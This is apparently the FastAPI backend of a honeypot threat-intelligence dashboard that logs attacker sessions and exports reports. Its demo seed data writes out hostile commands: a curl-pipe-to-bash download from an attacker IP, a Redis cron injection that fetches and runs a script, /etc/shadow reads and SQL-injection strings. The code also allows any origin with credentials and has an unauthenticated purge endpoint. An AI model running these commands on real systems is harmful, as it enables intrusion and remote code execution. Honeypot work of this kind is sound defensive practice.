import csv
import datetime
import io
import json
from fastapi import FastAPI, Depends, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, JSONResponse
from sqlalchemy.orm import Session
import database
import models
import schemas
import decoys
import middleware
from geolocate import IPThreatIntelligenceService
from analytics import ThreatAnalyticsEngine
from reporting import IncidentReportGenerator
from exporter import ThreatTelemetryExporter
from autoshun import AutoShunFirewallEngine

# Create database tables automatically on launch
models.Base.metadata.create_all(bind=database.engine)

app = FastAPI(title="SentinelTrap Threat Intelligence Backend")

# Enable Security Audit & API Rate Limiting Middleware
app.add_middleware(middleware.SecurityAuditMiddleware, requests_per_minute=300)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include Decoy Management Router (/api/decoys)
app.include_router(decoys.router)

# Real-time WebSocket connection pool manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except Exception:
                pass

manager = ConnectionManager()

# --- REST Endpoints ---

@app.post("/api/sessions", response_model=dict)
async def create_session(payload: schemas.SessionCreate, db: Session = Depends(database.get_db)):
    ip = payload.ip_address
    
    # Enriched IP Geolocation & Threat Intelligence lookup
    geo_intel = IPThreatIntelligenceService.lookup_ip(ip)

    session = models.SessionModel(
        ip_address=ip,
        country=geo_intel.get("country", "Unknown"),
        city=geo_intel.get("city", "Unknown"),
        latitude=geo_intel.get("latitude", 0.0),
        longitude=geo_intel.get("longitude", 0.0),
        username_attempted=payload.username_attempted or "root",
        password_attempted=payload.password_attempted or "",
        started_at=datetime.datetime.utcnow()
    )
    db.add(session)
    db.commit()
    db.refresh(session)

    # Broadcast new session event to connected subscribers
    await manager.broadcast(json.dumps({
        "event_type": "session_created",
        "session": {
            "id": session.id,
            "ip_address": session.ip_address,
            "country": session.country,
            "city": session.city,
            "username_attempted": session.username_attempted,
            "started_at": session.started_at.isoformat()
        }
    }))
    return {"status": "success", "session_id": session.id}

@app.patch("/api/sessions/{session_id}")
async def end_session(session_id: str, db: Session = Depends(database.get_db)):
    session = db.query(models.SessionModel).filter(models.SessionModel.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    session.ended_at = datetime.datetime.utcnow()
    db.commit()

    await manager.broadcast(json.dumps({
        "event_type": "session_ended",
        "session_id": session_id,
        "ended_at": session.ended_at.isoformat()
    }))
    return {"status": "success"}

@app.post("/api/sessions/{session_id}/events")
async def create_event(session_id: str, payload: schemas.EventCreate, db: Session = Depends(database.get_db)):
    event = models.EventModel(
        session_id=session_id,
        event_type=payload.event_type,
        input_data=payload.input_data,
        output_data=payload.output_data,
        timestamp=datetime.datetime.utcnow()
    )
    db.add(event)
    db.commit()

    # Broadcast event payload
    await manager.broadcast(json.dumps({
        "event_type": "new_event",
        "session_id": session_id,
        "event": {
            "id": event.id,
            "event_type": event.event_type,
            "input_data": event.input_data,
            "output_data": event.output_data,
            "timestamp": event.timestamp.isoformat()
        }
    }))
    return {"status": "success"}

@app.get("/api/sessions")
def list_sessions(db: Session = Depends(database.get_db)):
    return db.query(models.SessionModel).order_by(models.SessionModel.started_at.desc()).all()

@app.get("/api/sessions/{session_id}")
def get_session(session_id: str, db: Session = Depends(database.get_db)):
    session = db.query(models.SessionModel).filter(models.SessionModel.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session

@app.get("/api/sessions/{session_id}/events")
@app.get("/api/events/session/{session_id}")
def get_session_events(session_id: str, db: Session = Depends(database.get_db)):
    return db.query(models.EventModel).filter(models.EventModel.session_id == session_id).order_by(models.EventModel.timestamp.asc()).all()

@app.get("/api/events/alerts")
def get_alert_events(db: Session = Depends(database.get_db)):
    """Fetch high-priority attack events enriched with session IP addresses."""
    results = (
        db.query(models.EventModel, models.SessionModel.ip_address)
        .join(models.SessionModel, models.EventModel.session_id == models.SessionModel.id)
        .order_by(models.EventModel.timestamp.desc())
        .limit(100)
        .all()
    )
    alerts = []
    for event, ip in results:
        alerts.append({
            "id": event.id,
            "session_id": event.session_id,
            "event_type": event.event_type,
            "input_data": event.input_data,
            "output_data": event.output_data,
            "timestamp": event.timestamp.isoformat() if event.timestamp else "",
            "ip_address": ip or "Unknown",
        })
    return alerts

@app.get("/api/threat-intel/ip/{ip_address}")
def get_ip_threat_profile(ip_address: str, db: Session = Depends(database.get_db)):
    """Retrieve full Threat Intelligence Profile & Risk Score for an IP address."""
    geo_intel = IPThreatIntelligenceService.lookup_ip(ip_address)
    analytics_profile = ThreatAnalyticsEngine.get_ip_threat_profile(ip_address, db)
    return {
        **geo_intel,
        **analytics_profile
    }

@app.get("/api/firewall/rules")
def get_autoshun_firewall_rules(risk_threshold: int = 75, db: Session = Depends(database.get_db)):
    """Generate dynamic iptables, ufw, and decoy NAT redirection rules for high-risk IPs."""
    return AutoShunFirewallEngine.generate_firewall_rules(db, risk_threshold)

@app.get("/api/reports/pdf/{session_id}")
def download_pdf_incident_report(session_id: str, db: Session = Depends(database.get_db)):
    """Generate and stream a forensic PDF Incident Report for a specific session."""
    try:
        pdf_buffer = IncidentReportGenerator.generate_pdf_report(session_id, db)
        return StreamingResponse(
            pdf_buffer,
            media_type="application/pdf",
            headers={"Content-Disposition": f"attachment; filename=incident_report_{session_id[:8]}.pdf"}
        )
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))

@app.get("/api/reports/stix")
def export_stix21_threat_intel(db: Session = Depends(database.get_db)):
    """Export captured threat telemetry as a STIX 2.1 JSON Cyber Threat Intelligence bundle."""
    return JSONResponse(content=ThreatTelemetryExporter.export_stix21_format(db))

@app.get("/api/reports/cef")
def export_cef_syslog_stream(db: Session = Depends(database.get_db)):
    """Export event telemetry as Common Event Format (CEF) syslog stream for SIEM integrations."""
    cef_data = ThreatTelemetryExporter.export_cef_format(db)
    return StreamingResponse(
        io.BytesIO(cef_data.encode()),
        media_type="text/plain",
        headers={"Content-Disposition": "attachment; filename=sentineltrap_events.cef"}
    )

@app.get("/api/stats/overview")
def get_stats_overview(db: Session = Depends(database.get_db)):
    total_sessions = db.query(models.SessionModel).count()
    total_events = db.query(models.EventModel).count()

    # Top targeted usernames
    users = db.query(models.SessionModel.username_attempted).all()
    user_counts = {}
    for (u,) in users:
        user_counts[u] = user_counts.get(u, 0) + 1

    top_usernames = [{"name": k, "count": v} for k, v in sorted(user_counts.items(), key=lambda x: x[1], reverse=True)[:5]]

    # Top executed commands
    commands = db.query(models.EventModel.input_data).filter(models.EventModel.event_type.in_(["command_execution", "web_scan_attempt", "ftp_command_execution", "redis_command_probe"])).all()
    cmd_counts = {}
    for (cmd,) in commands:
        if cmd:
            c = cmd.strip()
            cmd_counts[c] = cmd_counts.get(c, 0) + 1

    top_commands = [{"name": k, "count": v} for k, v in sorted(cmd_counts.items(), key=lambda x: x[1], reverse=True)[:5]]

    return {
        "total_sessions": total_sessions,
        "total_events": total_events,
        "top_usernames": top_usernames,
        "top_commands": top_commands
    }

@app.delete("/api/data/clear")
async def clear_all_captured_data(db: Session = Depends(database.get_db)):
    """
    Clears all captured attacker sessions, telemetry events, and triggered decoys.
    Resets the SOC dashboard to a clean zero state and notifies all live WebSockets.
    """
    try:
        deleted_events = db.query(models.EventModel).delete()
        deleted_sessions = db.query(models.SessionModel).delete()
        db.query(models.DecoyModel).update({models.DecoyModel.status: "inactive", models.DecoyModel.triggered_by_session: None, models.DecoyModel.activated_at: None})
        db.commit()
        
        # Broadcast real-time purge event to all connected WebSockets immediately
        await manager.broadcast(json.dumps({"event": "data_cleared", "timestamp": datetime.datetime.utcnow().isoformat()}))
        
        return {
            "status": "success",
            "message": "All captured threat telemetry and attacker sessions have been purged.",
            "deleted_sessions": deleted_sessions,
            "deleted_events": deleted_events
        }
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to clear database: {str(e)}")

@app.post("/api/data/seed")
async def seed_example_data(db: Session = Depends(database.get_db)):
    """
    Populates realistic attacker sessions, credentials, geolocations, and MITRE commands for demonstration.
    """
    try:
        import uuid
        sample_sessions = [
            {
                "id": "sess-live-ssh-01",
                "ip_address": "185.220.101.5",
                "protocol": "SSH",
                "country": "Germany",
                "city": "Frankfurt",
                "latitude": 50.1109,
                "longitude": 8.6821,
                "username_attempted": "root",
                "password_attempted": "admin1234",
                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=4),
                "ended_at": None,
                "events": [
                    ("login_attempt", "root / admin1234", "Accepted password for root from 185.220.101.5 port 52344 ssh2", "SSH"),
                    ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", "SSH"),
                    ("command_execution", "whoami", "root", "SSH"),
                    ("command_execution", "cat /etc/shadow", "root:$6$Z8sK1xQ...:18900:0:99999:7:::\ndaemon:*:18885:0:99999:7:::", "SSH"),
                    ("command_execution", "curl -s http://185.220.101.5/stage2.sh | bash", "Resolving host... Downloading payload (14.2 KB)... Staged in /tmp/.sys_update", "SSH"),
                    ("command_execution", "crontab -l", "no crontab for root", "SSH"),
                ]
            },
            {
                "id": "sess-live-http-02",
                "ip_address": "194.26.29.114",
                "protocol": "HTTP",
                "country": "Netherlands",
                "city": "Amsterdam",
                "latitude": 52.3676,
                "longitude": 4.9041,
                "username_attempted": "admin",
                "password_attempted": "' OR '1'='1",
                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=9),
                "ended_at": None,
                "events": [
                    ("login_attempt", "admin'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
                    ("command_execution", "SELECT * FROM users WHERE username='admin' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--", "Trap Activated: Honeytoken DB schema accessed", "HTTP"),
                    ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
                ]
            },
            {
                "id": "sess-live-mysql-03",
                "ip_address": "45.155.205.233",
                "protocol": "MySQL",
                "country": "Russia",
                "city": "Moscow",
                "latitude": 55.7558,
                "longitude": 37.6173,
                "username_attempted": "root",
                "password_attempted": "toor",
                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=15),
                "ended_at": None,
                "events": [
                    ("login_attempt", "root / toor", "Handshake 5.7.34-MySQL-Standard accepted", "MySQL"),
                    ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
                    ("command_execution", "SELECT * FROM payments_db.credit_cards LIMIT 10;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT]", "MySQL"),
                ]
            },
            {
                "id": "sess-live-redis-04",
                "ip_address": "91.240.118.242",
                "protocol": "Redis",
                "country": "Bulgaria",
                "city": "Sofia",
                "latitude": 42.6977,
                "longitude": 23.3219,
                "username_attempted": "default",
                "password_attempted": "none",
                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=24),
                "ended_at": None,
                "events": [
                    ("login_attempt", "unauthenticated", "Redis 6.0.9 ready", "Redis"),
                    ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
                    ("command_execution", "CONFIG SET dbfilename root", "OK", "Redis"),
                    ("command_execution", "SET backup '* * * * * curl http://91.240.118.242/cron.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
                    ("command_execution", "SAVE", "DB saved on disk", "Redis"),
                ]
            },
            {
                "id": "sess-closed-telnet-05",
                "ip_address": "103.149.138.82",
                "protocol": "Telnet",
                "country": "Singapore",
                "city": "Singapore",
                "latitude": 1.3521,
                "longitude": 103.8198,
                "username_attempted": "support",
                "password_attempted": "support123",
                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=45),
                "ended_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=30),
                "events": [
                    ("login_attempt", "support / support123", "Telnet terminal session initialized", "Telnet"),
                    ("command_execution", "enable", "Password:", "Telnet"),
                    ("command_execution", "sh running-config", "Building configuration... Current configuration : 1084 bytes", "Telnet"),
                ]
            }
        ]

        added_sessions = 0
        for s in sample_sessions:
            existing = db.query(models.SessionModel).filter(models.SessionModel.ip_address == s["ip_address"]).first()
            if not existing:
                sess_obj = models.SessionModel(
                    id=s["id"],
                    ip_address=s["ip_address"],
                    protocol=s["protocol"],
                    country=s["country"],
                    city=s["city"],
                    latitude=s["latitude"],
                    longitude=s["longitude"],
                    username_attempted=s["username_attempted"],
                    password_attempted=s["password_attempted"],
                    started_at=s["started_at"],
                    ended_at=s["ended_at"]
                )
                db.add(sess_obj)
                db.commit()
                added_sessions += 1

                for idx, ev in enumerate(s["events"]):
                    ev_obj = models.EventModel(
                        session_id=s["id"],
                        timestamp=s["started_at"] + datetime.timedelta(seconds=(idx + 1) * 20),
                        protocol=ev[3],
                        event_type=ev[0],
                        input_data=ev[1],
                        output_data=ev[2]
                    )
                    db.add(ev_obj)
                db.commit()

        # Broadcast real-time seed event to all connected WebSockets immediately
        await manager.broadcast(json.dumps({"event": "data_seeded", "total_seeded": added_sessions, "timestamp": datetime.datetime.utcnow().isoformat()}))

        return {
            "status": "success",
            "message": f"Seeded {added_sessions} demo attacker sessions with forensic telemetry events.",
            "total_seeded": added_sessions
        }
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to seed demo data: {str(e)}")

@app.get("/api/reports/export")
def export_logs(format: str = "json", db: Session = Depends(database.get_db)):
    events = db.query(models.EventModel).all()
    if format == "csv":
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Session ID", "Timestamp", "Event Type", "Input Data", "Output Data"])
        for e in events:
            writer.writerow([e.id, e.session_id, e.timestamp, e.event_type, e.input_data, e.output_data])
        output.seek(0)
        return StreamingResponse(
            io.BytesIO(output.getvalue().encode()),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=attack_logs.csv"}
        )
    else:
        return [{
            "id": e.id,
            "session_id": e.session_id,
            "timestamp": e.timestamp.isoformat(),
            "event_type": e.event_type,
            "input_data": e.input_data,
            "output_data": e.output_data
        } for e in events]

# --- WebSocket & Real-Time Endpoints ---

@app.get("/ws")
def ws_info():
    return {"status": "online", "message": "SentinelTrap WebSocket endpoint. Connect using ws://.../ws"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)
